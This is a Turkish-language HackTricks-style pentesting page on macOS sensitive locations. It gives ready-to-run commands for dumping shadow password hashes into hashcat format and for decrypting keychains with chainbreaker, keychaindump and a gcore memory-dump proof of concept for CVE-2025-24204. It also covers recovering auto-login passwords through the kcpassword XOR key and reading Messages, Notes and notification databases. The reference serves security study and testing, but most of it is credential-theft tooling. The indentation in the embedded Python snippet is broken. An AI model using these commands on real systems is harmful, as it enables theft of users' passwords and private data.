# macOS Hassas Konumlar & İlginç Daemonlar

{{#include ../../../banners/hacktricks-training.md}}

## Parolalar

### Shadow Parolaları

Shadow parola, kullanıcının yapılandırmasıyla birlikte plistler içinde **`/var/db/dslocal/nodes/Default/users/`** konumunda saklanır.\
Aşağıdaki tek satırlık komut, kullanıcılar hakkındaki **tüm bilgileri** (hash bilgileri dahil) dökmek için kullanılabilir:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) hash'i **hashcat** **formatına** dönüştürmek için kullanılabilir.

Servis olmayan tüm hesapların creds'lerini hashcat formatında dökecek alternatif bir tek satırlık komut `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Another way to obtain the `ShadowHashData` of a user is by using `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Bu dosya **yalnızca** sistem **single-user mode**'da çalışırken kullanılır (yani çok sık değil).

### Keychain Dump

security binary'yi kullanarak **dump the passwords decrypted** yaptığınızda, kullanıcıdan bu işlemi onaylamasını isteyen birkaç istem gösterilecektir.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Bu yoruma [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) dayanılarak, bu araçların Big Sur'da artık çalışmadığı görülüyor.

### Keychaindump Genel Bakış

macOS keychain'lerinden şifreleri çıkarmak için **keychaindump** adlı bir araç geliştirilmiştir, ancak [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) bağlantısında belirtildiği üzere Big Sur gibi daha yeni macOS sürümlerinde sınırlamalarla karşılaşmaktadır. **keychaindump**'ın kullanımı, saldırganın erişim sağlamasını ve ayrıcalıkları **root** seviyesine yükseltmesini gerektirir. Araç, kullanıcı oturum açtığında keychain'in varsayılan olarak kullanım kolaylığı açısından kilidi açık olduğundan yararlanır; bu, uygulamaların kullanıcı parolasını tekrar tekrar istemeden keychain'e erişmesine imkan tanır. Ancak kullanıcı her kullanımın ardından keychain'ini kilitlemeyi seçerse **keychaindump** etkisiz hale gelir.

**Keychaindump**, Apple tarafından yetkilendirme ve kriptografik işlemler için bir daemon olarak tanımlanan ve keychain'e erişim için kritik öneme sahip **securityd** adlı belirli bir süreci hedefleyerek çalışır. Çıkarma süreci, kullanıcının oturum açma parolasından türetilmiş bir **Ana Anahtar**'ın tespit edilmesini içerir. Bu anahtar, keychain dosyasını okumak için esastır. **Ana Anahtar**'ı bulmak için **keychaindump**, `vmmap` komutunu kullanarak **securityd**'nin bellek yığınını tarar; `MALLOC_TINY` olarak işaretlenmiş alanlarda olası anahtarlar arar. Bu bellek konumlarını incelemek için aşağıdaki komut kullanılır:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Potansiyel master key'ler tespit edildikten sonra, **keychaindump** heap'lerde master key adayı olduğunu gösteren belirli bir deseni (`0x0000000000000018`) arar. Bu anahtarı kullanmak için deobfuscation da dahil olmak üzere ek adımlar gereklidir; bunlar **keychaindump**'ın kaynak kodunda açıklanmıştır. Bu alana odaklanan analistler, keychain'i çözmek için gerekli kritik verilerin **securityd** sürecinin belleğinde saklandığını bilmelidir. **keychaindump**'ı çalıştırmak için örnek bir komut:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) OSX keychain'den adli açıdan sağlam bir şekilde aşağıdaki türde bilgileri çıkarmak için kullanılabilir:

- Hash'lenmiş Keychain parolası, [hashcat](https://hashcat.net/hashcat/) veya [John the Ripper](https://www.openwall.com/john/) ile kırılmaya uygun
- İnternet Parolaları
- Genel Parolalar
- Özel Anahtarlar
- Genel Anahtarlar
- X509 Sertifikaları
- Güvenli Notlar
- Appleshare Parolaları

Keychain açma parolası verildiğinde, [volafox](https://github.com/n0fate/volafox) veya [volatility](https://github.com/volatilityfoundation/volatility) kullanılarak elde edilmiş bir master key, veya SystemKey gibi bir unlock dosyası mevcutsa, Chainbreaker ayrıca düz metin parolaları da sağlar.

Bu Keychain'i açmanın bu yöntemlerinden biri olmadan, Chainbreaker diğer tüm mevcut bilgileri görüntüler.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey ile keychain anahtarlarını (parolalarla birlikte) dökümleyin**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain anahtarlarını dökme (şifrelerle) — hash kırma**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain anahtarlarını (parolalarla) memory dump ile dökme**

[Bu adımları izleyin](../index.html#dumping-memory-with-osxpmem) bir **memory dump** gerçekleştirmek için.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Kullanıcının parolasını kullanarak keychain anahtarlarını (parolalar dahil) dök**

Eğer kullanıcının parolasını biliyorsanız, bunu kullanarak kullanıcının keychain'lerini **dökmek ve şifrelerini çözmek** için kullanabilirsiniz.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key `gcore` yetkisi aracılığıyla (CVE-2025-24204)

macOS 15.0 (Sequoia) `/usr/bin/gcore`'u **`com.apple.system-task-ports.read`** yetkisiyle birlikte gönderdi; bu yüzden herhangi bir yerel admin (veya kötü amaçlı imzalı uygulama) **SIP/TCC uygulanmış olsa bile herhangi bir işlem belleğini dökebilir**. `securityd`'nin dökümü **Keychain master key**'i açık şekilde leaks eder ve kullanıcı parolası olmadan `login.keychain-db`'yi şifre çözmenizi sağlar.

**Zafiyetli sürümlerde (15.0–15.2) hızlı repro:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Bildirimler

Bildirim verilerini `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` içinde bulabilirsiniz.

En ilginç bilgilerin çoğu **blob** içinde olacak. Bu nedenle bu içeriği **çıkarıp** ve **dönüştürerek** **insan** **okunabilir** hale getirmeniz veya **`strings`** kullanmanız gerekecek. Erişmek için şu komutu kullanabilirsiniz:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Son gizlilik sorunları (NotificationCenter DB)

- macOS **14.7–15.1** sürümlerinde Apple banner içeriğini `db2/db` SQLite içinde uygun biçimde sansürlemeden sakladı. CVE'ler **CVE-2024-44292/44293/40838/54504** herhangi bir yerel kullanıcının DB'yi açarak diğer kullanıcıların bildirim metinlerini okumasına izin veriyordu (TCC istemi yok). **15.2**'de DB'yi taşıyarak/kilitleyerek düzeltildi; eski sistemlerde yukarıdaki yol hâlâ son bildirimleri ve ekleri leaks.
- Veritabanı yalnızca etkilenen build'lerde world-readable (tüm kullanıcılar tarafından okunabilir) durumdaydı; bu yüzden legacy endpoints üzerinde hunting yaparken güncellemeden önce kopyalayın, artefacts'ları korumak için.

### Notlar

Kullanıcıların **Notlar** verileri `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` içinde bulunur.
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Preferences

In macOS apps preferences are located in **`$HOME/Library/Preferences`** and in iOS they are in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

macOS'ta CLI aracı **`defaults`** **Preferences dosyasını değiştirmek** için kullanılabilir.

**`/usr/sbin/cfprefsd`** XPC servislerini `com.apple.cfprefsd.daemon` ve `com.apple.cfprefsd.agent` sahiplenir ve tercihleri değiştirmek gibi eylemleri gerçekleştirmek için çağrılabilir.

## OpenDirectory permissions.plist

The file `/System/Library/OpenDirectory/permissions.plist` contains permissions applied on node attributes and is protected by SIP.\
Dosya `/System/Library/OpenDirectory/permissions.plist` düğüm özniteliklerine uygulanan izinleri içerir ve SIP tarafından korunur.\
Bu dosya belirli kullanıcılara UUID ile (ve uid ile değil) izinler verir; böylece `ShadowHashData`, `HeimdalSRPKey` ve `KerberosKeys` gibi belirli hassas bilgilere erişebilirler:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Sistem Bildirimleri

### Darwin Bildirimleri

Bildirimler için ana daemon **`/usr/sbin/notifyd`**'dir. Bildirim almak için istemciler `com.apple.system.notification_center` Mach portu üzerinden kaydolmalıdır (bunları `sudo lsmp -p <pid notifyd>` ile kontrol edin). Daemon `/etc/notify.conf` dosyasıyla yapılandırılabilir.

Bildirimler için kullanılan adlar benzersiz ters DNS gösterimleridir ve bir bildirim bunlardan birine gönderildiğinde, bunu işleyebileceğini belirten istemci(ler) onu alır.

Mevcut durumu dökmek (ve tüm adları görmek) için notifyd işlemine SIGUSR2 sinyali gönderilip oluşturulan dosya okunabilir: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Dağıtılmış Bildirim Merkezi

**Distributed Notification Center**'ın ana ikili dosyası **`/usr/sbin/distnoted`** olan bu servis, bildirim göndermenin başka bir yoludur. Bazı XPC servisleri sunar ve istemcileri doğrulamaya çalışmak için bazı kontroller gerçekleştirir.

### Apple Push Bildirimleri (APN)

Bu durumda uygulamalar **konular** için kayıt olabilir. İstemci, Apple'ın sunucularına **`apsd`** aracılığıyla bağlanarak bir token oluşturur. Ardından sağlayıcılar da bir token oluşturmuş olur ve istemcilere mesaj göndermek için Apple'ın sunucularına bağlanabilirler. Bu mesajlar yerel olarak **`apsd`** tarafından alınır ve bildirimi bekleyen uygulamaya iletilir.

Tercihler `/Library/Preferences/com.apple.apsd.plist` konumunda bulunur.

macOS'ta `/Library/Application\ Support/ApplePushService/aps.db` ve iOS'ta `/var/mobile/Library/ApplePushService` konumunda yerel bir mesaj veritabanı vardır. 3 tabloya sahiptir: `incoming_messages`, `outgoing_messages` ve `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Daemon ve bağlantılar hakkında bilgi almak için ayrıca şu komutları kullanabilirsiniz:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Kullanıcı Bildirimleri

Bunlar kullanıcının ekranda görmesi gereken bildirimlerdir:

- **`CFUserNotification`**: Bu API, ekranda bir mesaj içeren açılır pencere (pop-up) göstermenin bir yolunu sağlar.
- **The Bulletin Board**: iOS'ta kısa süreli görünen ve sonra kaybolan bir banner gösterir; bu banner daha sonra Bildirim Merkezi'nde saklanır.
- **`NSUserNotificationCenter`**: Bu, MacOS'taki iOS bülten panosunun karşılığıdır. Bildirimlerin veritabanı şu konumda bulunur: `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Referanslar

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
